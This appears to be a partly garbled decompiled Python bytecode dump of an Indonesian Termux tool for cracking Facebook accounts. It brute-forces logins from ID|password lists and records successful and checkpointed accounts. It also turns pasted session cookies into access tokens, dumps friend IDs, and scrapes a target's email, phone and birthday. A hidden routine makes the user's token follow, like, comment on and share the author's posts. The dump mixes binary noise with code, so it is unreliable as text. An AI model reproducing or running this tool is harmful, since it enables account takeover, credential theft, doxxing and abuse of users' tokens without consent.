."tzcrackffb.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t
 d t d t d t d t d t
 d � td��| j| j� t�| j� t�  d S �Nr   r   r   rC  r1  r   r,  rB  rE  rF  r"  rG  r%  r�  �rK   r�   r�   r�   r,  rN   r,  r+  r%  rP   rI  r�  r�  r�  r   r�  r)  rR   r2  r   r   r   r,  6	  s    ,

tzcrackffb.pwlistc                 C   s^  �z@|� d�D ]�}t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�q|� d�dkrtd|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�qqq|  j	d7  _	td| j	t
| j�t
| j�t
| j�f dd� tj��  W n   | �|� Y n0 d S )Nr,  r�   zhttps://free.facebook.comr  r�  �/[0;33m[[0;37mCP[0;33m] %s|%s               r3  r$  r"  r<  r4  r  �/[0;32m[[0;37mOK[0;32m] %s|%s               zOK-r
   r_  r=   r�  )rG   Zf_fbrP   r�  r�   r+   rI  r"   r&  r'  rN   r+  r    r!   r#   r�  �r.  r+  rM   r6  r   r   r   r�  A	  s0    
���:zcrackffb.mainN�	r7  r8  r9  r   r   r   r0  r,  r�  r   r   r   r   r�  �  s
   
4r�  c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	r�  r   c              
   C   sn  g | _ g | _d| _t�  tdt d t d t d t d t d t d t d	 t � ttd t d t d t d
 �}|dkr�q\q\|dks�|dk�r�z�z$|| _	t
| j	��� �� | _W �qW q� t�y } z$td| � W Y d }~q�W Y d }~q�d }~0 0 q�g | _| jD ]8}z| j�d|�d�d i� W n   Y �qY n0 �qW n> t�y� } z$td| � W Y d }~q\W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qjq\|dk�s�|dkr\z�z$|| _	t
| j	��� �� | _W �q>W n@ t�y8 } z&td| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �qJY n0 �qJW n2 t�y� } ztd| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j	� t�  �qjq\d S )Nr   r   r   r   r   r  r  r  r  rN  r<   r  r  rd  r�   r�   rB  r  r  r
   r  rB  rE  rF  r"  rG  r%  r:   re  r-  r   r   r   r0  [	  s`    D$
$
"$
(
."tzcrack.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t
 d t d t d t d t d t
 d � td��| j| j� t�| j� t�  d S rf  rg  r2  r   r   r   r,  �	  s    ,

tzcrack.pwlistc                 C   sH  �z*|� d�D �]
}t|� d�|d�}|� d�dkr�td|� d�|f � t|� d�|� t�d� | j�d|� d�|f � td	t	 d
 d��
d|� d�|f �  �qq|� d�dkrtd|� d�|f � | j�d|� d�|f � tdt	 d d��
d|� d�|f �  �qqqq|  jd7  _W n   | �|� Y n0 d S )Nr,  r�   r   r  r�  rh  r�  r3  r$  r"  r<  r4  r  ri  r!  z.txt.txtr
   )rG   r  rP   r�   r$   r%   r�  r�   r+   rI  r"   r&  r'  r�  rj  r   r   r   r�  �	  s2    
�
��z
crack.mainNrk  r   r   r   r   r�  X	  s
   
4r�  c                  C   sB  t �d� t�  ttd t d t d t d � ttd t d t d t d � ttd t d	 t d t d
 � ttd t d t d t d �} | dkr�ttd t d t d t d � t�  nj| dkr�t�  t	�  nT| dk�rt�  t
�  n<| d	k�rt�  n*ttd t d t d t d � t�  d S )Nr   rB  r�   r   z Login Tokenr   r�   z Login Cookiesr�   z Exitr   rN  r<   r   rO  )r   r   r   rP   r�   r�   rK   r�   �Get_Ua�	log_token�genrR   )Zsekr   r   r   r�   �	  s&    
$$$$$

$r�   c                  C   s  t �d� t�  ttd � ttd � ttd t d t d t d �} zlt�	d|  �}t
�|j�}|d	 }td
d�}|�| � |��  ttd t d t d t d � t�  W nF ty�   ttd t d t d t d � t �d� t�  Y n0 d S )Nr   zJYou Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile�0LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxxrB  r   r   z	 Token : z+https://graph.facebook.com/me?access_token=r�   r�   rC   � Login Successfulr   r   � Token Invalid)r   r   r   rP   rL   rK   r�   r�   rF   rG   r�   r�   rI   r+   r"   rQ   �
bot_followrV   r�   )r3   rK  rL  rM  Zzeddr   r   r   rm  �	  s$    
$

$
$
rm  c                  C   sn  t �d� t�  td� td� ttd t d t d t d �} zTtjdd	d
dddddddd�	d| id�}t	�
d|j�}|d u r�dnd|�d� }W n� tjjy�   ttd t d t d t d � Y nL ttg�y   ttd t d t d t d � t �d� t�  Y n0 tdd�} | �|�d�� | ��  ttd t d t d t d � t�  d S ) Nr   zMYou Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile...ro  rB  r   r   z
 Cookies: �Ghttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_z�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36�https://m.facebook.com/r  �https://m.facebook.comr�   r  r�   r�  �text/html; charset=utf-8)	r
  r  �hostr  r  r  r  r  r	  �cookie)r  r*  �	(EAAA\w+)z&
* Fail : maybe your cookie invalid !!z
* Your fb access token : r
   r   r   z No Connectionz Cookies Invalidr�   rC   rp  )r   r   r   rP   rK   r�   r�   rF   rG   r
  rZ  rI   �grouprS   rT   rV   r-   r�   r+   r"   rQ   rr  )rx  r�   Z
find_token�hasilr   r   r   rn  �	  sB    
$���($

$rn  c           
   
   C   s�  d}zt dd��� }W nF ty\   ttd t d t d t d � t�d� t�  Y n0 z&t	�
d	|  d
 | �}t�|j�}W n\ ty� } zttd � t�  W Y d }~n0d }~0  ttfy�   ttd � t�  Y n0 z|d }W n ttf�y
   d}Y n0 z|d }W n ttf�y4   d}Y n0 ttd | | � t�d� ttd | |  � t�d� ttd | | � t�d� ttd | | � t�d� t dd�}	|	�| d | d | d � |	��  d S )Nr   r�   r   rB  r   r   rq  rj  r�   r�   �Masalah Tidak DiTemukanr�   r=   r�   zName Facebook : ���Q��?zID Facebook   : zPassword      : zTanggal Lahir : zget_ttl.txtz+ar\   r   )r+   r,   r-   rP   r�   r�   r   r   r�   rF   rG   r�   r�   rI   r�   rL   rR   rV   r$   r%   r"   rQ   )
r�   rR  rM   r3   r�   r�   r'   rM  r�   Zgxr   r   r   �get_ttl
  s>    $



r~  c            "   
   C   s6  d} zt dd��� }W nF ty\   ttd t d t d t d � t�d� t�  Y n0 z6t	t
d	 t �}t�d
| d | �}t�|j�}W n\ ty� } zttd � t�  W Y d }~n0d }~0  ttfy�   ttd � t�  Y n0 z|d }W n$ ttf�y"   td t }Y n0 z|d }W n$ ttf�yT   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }	W n$ ttf�y�   td t }	Y n0 z|d }
W n$ ttf�y�   td t }
Y n0 z|d }W n$ ttf�y   td t }Y n0 z|d }W n$ ttf�yN   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 zd|d d  }W n$ ttf�y�   td t }Y n0 z|d d }W n$ ttf�y�   td t }Y n0 z|d d }W n$ ttf�y&   td t }Y n0 z|d }W n$ ttf�yX   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }W n$ ttf�y    td t }Y n0 z|d }W n$ ttf�yR   td t }Y n0 z�t�d
| d  | �}g }t�|j�}|d d! �d"d#�}t |d$�}|d% D ]>} |�| d d& | d  � |�| d d& | d  d' � �q�|��  d(t|� }W n  t�y   td t }Y n0 z�t�d)||f �}t�|j�}t |d$�}|d% D ]L}|d }|d }|�d"�d* } |�|d& |  � |�|d& |  d' � �qL|��  W n   Y n0 z.t�d+||f �}t�|j�}|d, d- }!W n. ttf�y   d.ttf }!Y n   Y n0 td't d/ � t�d0� td't d1| |f  � ttd2| |f  � ttd3| |f  � t�d0� ttd4| |
f  � t�d0� ttd5| |f  � t�d0� td't d6 � t�d0� td't d7| |f  � t�d0� ttd8| |f  � t�d0� ttd9| |f  � t�d0� ttd:|  � t�d;� ttd<|!  � t�d0� ttd=||f  � t�d;� ttd>| |f  � t�d0� ttd?| |f  � t�d0� ttd@| |f  � t�d0� ttdA| |f  � t�d0� ttdB| |f  � t�d0� t d't dC � t	tdD � t!�  d S )ENr   r�   r   rB  r   r   rq  rj  zMasukkan ID Target :r�   r�   r|  r�   u   —Z
first_nameZ	last_namer�   r[  r�   �timezoneZrelationship_statusz	dengan %sZsignificant_other�locationZhometownZlinkZupdated_timeZmobile_phoner  ZaboutZgenderr�   r;  r=   r�   rC   r�   r�   r   r^   z5https://graph.facebook.com/%s/friends?access_token=%sr   r�   r�   r�   z%s-%szInformasih Targwt !!g333333�?zFull Name       : %s%szFirst Name      : %s%szLast Name       : %s%szUserName        : %s%szTanggal Lahir   : %s%szData Data Target !!zGmail Facebook  : %s%szNomor Telepons  : %s%szJenis Kelamin   : %s%szJumlah Teman    : %sr}  zFollowers       : %szStatus Hubungan : %s %szLink Facebook   : %s%szTentang Status  : %s%szKota Asal       : %s%szTinggal         : %s%szTerahir DiUpdate: %s%szAthour : Mr.RiskyzTekan Enter Untuk Kembali)"r+   r,   r-   rP   r�   r�   r   r   r�   rK   r�   rF   rG   r�   r�   rI   r�   rL   rR   rV   r�   r�   r�   r�   r"   rQ   rN   r�   r  r$   r%   r�   r(   r�   )"rM   r3   r�   r�   r�   r'   rM  ZnamadeZnamabeZidfbr�  r�   ZtzimZstasZdgnZtiglZdariZlinsZuptdZnmrrZemaiZbiooZgndrr   r�   r&   ZqqZysZtemnZbmxr�   r�   r�   r�   r   r   r   rY  %
  s   $

"
"rY  c                   C   s&  t �d� t�  ttd t d t d t � ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � t	�  d S )Nr   z
[ zResult Crack -- Hasil Crackr  r2  zcat Hasil/OK*.txtr   r   r   z No Result Foundr1  zcat Hasil/CP*.txtZBack)
r   r   r   rP   r�   r�   r(  r-   rK   r�   r   r   r   r   rZ  �
  s    
  * * rZ  c                   C   s
   t �  d S r   )r[  r   r   r   r   rl  �
  s    rl  c                  C   sv  zt dd��� } W �n\ t�yp   t�d� t�d� d}d}d}t�  tt� d�� tt� d	�� tt	� d
�� tt	� d�t
 � ttd t
 d t d t
 d t d t d t d � ttd t
 d t d t
 d � ttd t
 d t d t
 d � ttd t
 d t d t
 d � td�}|dk�sJ|dk�r~t�d� t dd�}|�|� |��  tt	d � n�|dk�s�|dk�r�t�d� t dd�}|�|� |��  tt	d � n�|dk�s�|dk�rt�d� t dd�}|�|� |��  tt	d � n^|dk�s"|dk�r^t�d� td �}t dd�}|�|� |��  tt	d � ntd!� t�  Y n0 d S )"Nr   r   rR  r   r   z�Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4z�Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]zUser Agent BrokenzCreated By Riskyz,Silahkan Pilih User Agent Untuk DiGunakan !!z"Please Select A User Agent To Use
r   r�   r   z Made by Risky z( ZRecommendedz )r�   z Made by Dapuntar�   z Made by Anggar�   z Change User Agentz	Choose : r�   rC   zRun the Tools Again !!r�   r�   r�   zLogin Your User Agent User : zFailed to Choose)r+   r,   r-   r   r   r   r(   r�   rP   rL   r�   r�   rM   rK   r"   rQ   rR   r[  )r3   Zua_risZua_angZua_dam�vr?  Zxxr   r   r   r[  �
  sZ    

<$$$











r[  c               
   C   sn  zddd l } dd l } ddlm} ddlm} tj�d�dkrDt�d� tj�d�dkrbt	dd��
�  W n4 ty� } ztdt|� � W Y d }~n
d }~0 0 ttd	 t d
 � ttd t d t d t d � ttd t d t d t d � ttd �}|dv �r*ttd � t�d� t�  n@|dv �r<t�  n.|dv �rNt�  nttd � t�d� t�  d S )Nr   �r	  )r�   �resultF�result/cp.txtrL  zERROR : zPemisah Defalut : r\   zBBefore Continue Do you want to use the Default Splitting Distance r   z Y/n  r   zASebelum Lanjut Apakah Anda Mau Menggunakan Jarak Memisah Default z Y/n z	Select : r;   zJangan Kosong Kentodr�   rH  rc  r|  )rF   r  r	  Zconcurrent.futuresr�   r   r/   r0   r�  r+   rQ   r�   rP   r   rL   rM   r(   r�   r�   rK   r�   r�   r$   r%   r�   �kentodxx�kentodx)rF   r	  r�   �Er_  r   r   r   r�   �
  s4    
&$$




r�   c               ,   C   s  t �d� tdt� dt� dt� dt� dt� dt� dt� d	t� d
t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d�+� t� } | �rt	�  t
td � tdd��:}| D ]$}|�d�}|�t|d |d � q�W d   � n1 s�0    Y  nttd � d S )Nr   �
@ �Athour   : �ITSUKI AND RISKY
@ �Fcaebook : �m.facebook.com/llovexnxx
@ �Whatsapp : �wa.me/6283143565470
@ �Group FB : �Termux Indonesia
�  ________       _____              _____       _________
___  __ \_____ __  /______ _________  /______ ______  /
__  / / /_  _ \_  __/_  _ \_  ___/_  __/_  _ \_  __  /
_  /_/ / /  __// /_  /  __// /__  / /_  /  __// /_/ /
/_____/  \___/ \__/  \___/ \___/  \__/  \___/ \__,_/
�               ___________                     ______                ______
                 ___  ____/______ _____________ ___  /_ ______ ______ ___  /__
                 __  /_    _  __ `/_  ___/_  _ \__  __ \_  __ \_  __ \__  //_/
                 _  __/    / /_/ / / /__  /  __/_  /_/ // /_/ // /_/ /_  ,<
                 /_/       \__,_/  \___/  \___/ /_.___/ \____/ \____/ /_/|_|
�Gunakan r\   � Sebagai Pemisah !!r   �Hasil �OK �-Detetor Facebook DiSimpan Di : result/ok.txt
�CP �,Detetor Facebook DiSimpan Di : result/cp.txt�1
Login DiMulai
Hasil Loginnya DiSimpan Direquest
r�   r�   r   r
   �Masalah Tidak DiTemukan !!)r   r   �ngetikr�   r�   rM   r�   r�   r�   �select_methodrP   r�   r�   r�   �eksekusirR   r   )r�   r�   r�   r   r   r   r�    sj    
���������������������

8r�  c               ,   C   s0  t �d� tdt� dt� dt� dt� dt� dt� dt� d	t� d
t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d�+� tt	d � t
td �} t� }|�r t�  ttd � tdd��:}|D ]$}|�| �}|�t|d |d � q�W d   � n1 �s0    Y  nttd � d S )Nr   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r\   r�  r   r�  r�  r�  r�  r�  u=   Contoh Pemisah : Username|Password Atau Username • Passwordz
Pemisah : r�  r�   r�   r   r
   r�  )r   r   r�  r�   r�   rM   r�   r�   r(   rL   rK   r�   r�   r�  rP   r�   r�   r�   r�  rR   r   )Zppr�   r�   r�   r   r   r   r�  /  sn    
���������������������

:r�  Tc                 C   s�   | r4t d� t td t d � t td t d � ttd t �}|dv rft td � ttd �}qD|d	krttan*|d
kr�t�dd�ant td � td� d S )Nz
 [ Pilih Method Login ]z1.zFree Facebookz2.zMbasic Facebook
z	Method : r;   zKosong Mulu Ajgr�   r�   Zfreer  r|  F)	rP   r�   r�   rK   rM   r   r�  r�   r�  )ZshowZselectr   r   r   r�  P  s    r�  c              
   C   s  d}zt | |�}W n. tjjtjjtjjfy@   t| |� Y n0 |d }d|j�� v r�t	t
d t d t
 d�| |� � tdd��d	�| |�� �njd
|j�� v �r�|j�t�d|d j��d��d�d t�d|d j��d�d d�� t|t|d j��}|dk�rLt	t
d t d t
 d�| t� � tdd��d	�| t�� n�|dk�r�t	t
d t d t
 d�| |� � tdd��d	�| |�� nHt	td t d�t| |� � | td��� v�rtdd��d	�| |�� n$t	td t d t d�| |� � d S )Nr   r   r  zLogin Sukses rC  z {}|{}zresult/ok.txtrL  z{}|{}
r  z(https://.*?\.facebook.com)r
   �//�/checkpoint/)r  r  �new passwordzSuksess Change Password zresult/newpass.txt�no change passwordzFailed Change Password zresult/no_change.txtzCheckPoints u   ⟩⟩ {}{}|{}r�  zLogin Failed )�	login_risrF   rS   rT   ZChunkedEncodingErrorZReadTimeoutr�  r*  r  rP   rM   r�   rQ  r+   r"   r  r%  r
  rZ  r�  rz  r�   �tahap1�parserrI   �newpassr�   r�   r,   r   )r[  rR  �	useragent�respons�session�responr   r   r   r�  b  s,    $H
$
$r�  c                 K   s�   t �� }t|�td �j�}t|d�}|�| |d�� d|v rD|d= |j�t�	d�d ddt
d	d
ddtd td�
� |jtt|� |d�}||fS )Nr  Zsign_upr  Z_fb_noscriptr�  r
   r�   r�   r   r  r  r  )
r  r  r  r
  r	  r  r  r  r  r  r!  )rF   r�  r�  rG   r�  rI   �get_datar%  r  r�   r�  r  �
get_action)r[  rR  �kwargsr�  �parsingr�  r   r   r   r�  |  s    
0r�  c                 C   s�   t |d�}d|v r�|d= z,| j| jd �d�d t|� |d�j}W n tjjy^   d}Y n0 d	|v std
|�	� v r�t
| t|��S d| j�� v r�dS d S )N�"submit[logout-button-with-confirm]zsubmit[Yes]z
submit[No]r  r�  r   r!  r�   �password_newzbuat kata sandi barur  r�  )r�  r  r  r�   r�  rI   rF   rS   r)  r�  �tahap2r�  r*  r  )r�  r�  r�  r�  r   r   r   r�  �  s    
,
r�  c                 C   sV   t |d�}|�dti� | j| jd �d�d t|� |dd�}d|j�� v rRd	S d S )
Nr�  r�  r  r�  r   Fr  r  r�  )	r�  r%  r�  r  r  r�   r�  r*  r  )r�  r�  r�  r�  r   r   r   r�  �  s
    
(r�  c                 K   sB   | � dddd��D ]*}||d v r&qq|�|d |d i� q|S )NrK   T)r�   r  r�   r  )r(  r%  )r�  Zkecualir�  Zlnputr   r   r   r�  �  s    r�  c                 C   s   | � dddi�d S )Nr  r  r  r  )r'  )r�  r   r   r   r�  �  s    r�  c                 C   s
   t | d�S )Nr  r�  )Zhtmlr   r   r   r�  �  s    r�  �����Mb`?c                 C   s0   | d D ]"}t j�|� t j��  t|� qd S )Nr   )r    r!   r"   r#   r%   )ZkataZjumr_  r   r   r   r�  �  s    
r�  c                  C   s�  t �d� t�  td� td� td� td�} | dkrFt j��  �nB| dksX| dk�r`z�td	�}d
dddddddd|d�
}tjd|d�}t	�
d|j�}|�d�}tdd�}|�|� |��  tdd�}|�|� |��  t�  W nz t�y   td� t�d� t�  Y nP t�y8   td� t�d� t�  Y n& tjj�y\   td� t�  Y n0 n(| dk�st| dk�r�t j��  ntd� d S ) Nr   z [1] Login Menggunakan Cookiesz [2] Cara Mendapatkan Cookiesz [0] Keluarz
 [*] Input : r<   r�   r�   z [*] Cookies : r�  rt  r  ru  r  r�   r�  rv  )
r
  r  rw  r  r  r  r  r  r	  rx  rs  r  ry  r
   �coki.logrC   r�   z [x] Cookies Salahr@   z [x] Tidak Ada Koneksir�   r�   z [x] Isi Dengan Benar)r   r   r   rP   rK   r    rR   rF   rG   r
  rZ  rI   rz  r+   r"   rQ   Z	cek_login�AttributeErrorr$   r%   r  �UnboundLocalErrorrS   ZSSLError)Zlgrx  r�   ZcokiZcarir{  ZpupZpipr   r   r   r  �  s\    
�









r  c                   C   sB   t j�d�r8t j�d�dkr0ttd��� �� �S t�  nt�  d S )Nr�  r   )	r   r/   r0   �getsize�gets_dict_cookiesr+   r,   rJ   r  r   r   r   r   �
basecookie�  s
    r�  c              
   C   s�   i }z8| � d�D ]&}|�|� d�d |� d�d i� q|W S    | � d�D ]&}|�|� d�d |� d�d i� qN| Y S 0 d S �N�;r{   r   r
   z; �r�   r%  �r*  r�  rM   r   r   r   r�  �  s    $$r�  c                  C   s6   t } | dddtd�tj�d| ��| d ddd	d
�
}|S )Nr  r  r�  r<   z	://(.*?)$r  r�   r�   r   )
r  r  r  r  r
  r  r  r  r  r	  )ZhostmZuacrc  r  r
  r  )r  r   r   r   r   �hdcok�  s    .r�  c              
   C   s�   i }z8| � d�D ]&}|�|� d�d |� d�d i� q|W S    | � d�D ]&}|�|� d�d |� d�d i� qN| Y S 0 d S r�  r�  r�  r   r   r   �cvd�  s    $$r�  c                 C   s�  t | d� t�tj||t� d�jd�}|jddd�D �]R}tdt	t | ��
� �� � �f tj��  dt|�v �rnd	t|d
 �v r�q4n�t|d
 �}d|v �r|�d��d��dd�}tj�d|�}t	|�dk�rnd�|�}|t | ��
� v r�nt | d��d||f � njtj�d|�}|�d��d��dd�}t	|�dk�rnd�|�}|t | ��
� v �rVnt | d��d||f � d|jv r4t| ||d
 � q4td� td|  � td� t�  d S )Nr<  �r*  r  r  rL  T)�hrefz [*] Dump %s IDz	<img alt=zhome.phpr�  zprofile.phpZimgZaltz, profile picturer<   z/profile\.php\?id=(.*?)&r   z%s<=>%s
z/(.*?)\?zLihat Hasil Selanjutnyaz

 [*] Selesaiz [*] File Dump Tersimpan : z
 {Kembali})r+   r  r	  rF   rG   r�  rI   r(  rP   rN   r,   r�   r    r!   r#   r   r'  r�   r
  r  rc  r"   rZ  rK   r�   )r+  r   r  rM   �gr�   r  r�  r   r   r   rZ     sR    
��(

�
�
�
�
rZ  c                 C   s.   t j�d�r&t j�d�dkr dS dS ndS d S )Nr�  r   TF)r   r/   r0   r�  )r�  r   r   r   �cek&  s
    r�  c                  C   s  d } d }t d�dkrVz$ttd��� �� �}t|�} d}W qj   td� t�  Y qj0 nttd��� �� �} tjd| t	� d�j
}ttj�d|��d	kr�|dkr�tdd
��|� td�}td��dd�}t|| d| � n*zt�d� W n   Y n0 td� t�  d S )Nr
   Fr�  Tz [x] Cookies Invalidz'https://mbasic.facebook.com/profile.phpr�  Zlogoutr   rC   z [*] Query : z [*] Nama File : r=   r�   z(https://m.facebook.com/search/people/?q=)r�  r�  r+   r,   rJ   rP   r  rF   rG   r�  rI   rN   r  r
  r  r"   rK   r�   rZ  r   r�  )Zcvds�newrx  r   r�  r+  r   r   r   �dumpfl,  s8    ��r�  c                  C   s�  zJt dd��� } t dd��� }t�d|  �}t�|j�}|d }|d }W nF ty�   tt	d t
 d t	 d t
 d	 � t�d
� t�  Y n0 ttd � ttd | � ttd | � d}d}d}d}	d}
d}d}d}d}d}d}d}d}d}d}d}d}t|d | |d | g�}t|d | |d | g�}t||g�}d }t�d!|	 d" | d# | � t�d!|
 d" | d# | � t�d!| d" | d# | � td$� t�d%|  � t�d&|  � t�d'|  � td(� t�d!| d" | d# | � t�d!| d" | d# | � t�d!| d" | d# | � t�d!|	 d" | d# | � t�d!|
 d" | d# | � t�d!| d" | d# | � t�d!| d" | d# | � td)� t�d!| d* |  � t�d!| d* |  � t�d!| d* |  � t�d!|	 d* |  � t�d!|
 d* |  � t�d!| d* |  � t�d!| d* |  � td+� t�d,| � t�d-| � t�d.| � t�d/| � t�d0| � td1� t�d2� t�  d S )3Nr�   r   r@  r�   r�   rB  r   r   rq  r
   zWait a moment...zYour Name Facebook : zYour ID Facebook   : Z4111448792295892Z120338706765807Z167879918678352Z180923747373969Z172628718203472Z198550702277940Z198552118944465zJXNXX.COM AND YANDEX.COM AND ML.RATUKU.TOP AND UNBLOCJ.COM AND KENATIPU.COMz"@[100063690353340:0] LOVE ZERO TWOz]https://www.facebook.com/photo.php?fbid=4111448792295892&set=a.108534305920714&type=3&app=fblz\https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fblz]https://www.facebook.com/photo.php?fbid=4111450232295748&set=a.202528366521307&type=3&app=fblzGhttps://www.facebook.com/100063690353340/posts/167879918678352/?app=fblzGhttps://www.facebook.com/100063690353340/posts/198550702277940/?app=fblzGhttps://www.facebook.com/100063690353340/posts/198552118944465/?app=fblz8Yandex.com
Unblock.com
Ml.Ratuku.Top
Jomblo.Top
Xnxx.comzHhttps://www.facebook.com/100002924366263/posts/4111450325629072/?app=fblr   ZLOVEr�   z/comments/?message=rv  zTunggu Sebentar 05z~https://graph.facebook.com/me/feed/?link=https://www.facebook.com/100063690353340/posts/180923747373969/?app=fbl&access_token=z~https://graph.facebook.com/me/feed/?link=https://www.facebook.com/100063690353340/posts/198552118944465/?app=fbl&access_token=z�https://graph.facebook.com/me/feed/?link=https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl&access_token=zTunggu Sebentar 04zTunggu Sebentar 03z!/likes?summary=true&access_token=zTunggu Sebentar 02zDhttps://graph.facebook.com/100063690353340/subscribers?access_token=zDhttps://graph.facebook.com/100067783659018/subscribers?access_token=zDhttps://graph.facebook.com/100002924366263/subscribers?access_token=zDhttps://graph.facebook.com/110877271176800/subscribers?access_token=zWhttps://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=z, [0;97m[[0;92m+[0;97m] Login Successfullyr�   )r+   r,   rF   rG   r�   r�   rI   r-   rP   r�   r�   r$   r%   r�   r(   rL   Zpilihr  r�   )r3   r�   rK  rL  rM  r�   Zpost1Zpost2Zpost3Zpost4Zpost5Zpost6Zpost7ZkomZkom2Zkom3Zkom4Zkom5Zkom6Zkom7Zkom8Zkom9Zkom10Zkom_1Zkom_2Zkom_3Zreacr   r   r   rr  M  s�    $

rr  �__main__r�   rP  r:  rQ  r   r0  r�   zHow to Use Crack Not Login..zType : python prem.py crackzgit pull)T)r�  )�rP   r+   r,   r-  Zua_meZsettingr�   r'   r�   r�   r$   r%   rR   rF   rG   rI   rJ   Zlink01Zlink02rS   rT   r   r   rL   r    Z	license01Z	expired01ZKode_PremiumZ
Kode_AdminZKode_Premium2ZKode_Admin2ZNAMABHZakttglZexptglrH  ZttlpremZttladminrH   r[   r�   Zh2Zb2Zc2r�  Zu2Zm2Zp2Zk2r  r�   r�   r�   r�   r�   r�   �Hr�  r   r(  r�   �or�   r�   Zbulat2Zwar2Zinp2r=  r�  r�  r�  r�   r5  r6  r�  r&  Zcolorr   ZdatetimeZnow�strftimerI  r�   ZcurrentZyearZtahunZmonthZbulanZdayZhariZserZexpxZlogo_expZlogo_mtrM   ZexprV   r-   r   r   r(   r4   r9   r.   r7   r1   r8   r�   r�   r�   r�   r�   r�   r�   r9  r�   r�   rJ  r\  r�   rf  rg  rh  rV  rW  r�  rX  r�  r�  r  r  r  r�  r�  r�  r�  r�  r�   rm  rn  r~  rY  rZ  rl  r[  r�   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r  r�  r�  r�  r�  rZ  r�  r�  rr  r7  rN   �argvr�   r�   r�   r]  rK   r^  r�   r�   r�   r   r   r   r   �<module>   s�  
4
4


	 !ADy/#'@ 393#*2 \ _  .6,`snY^&! 0!

0
&!L





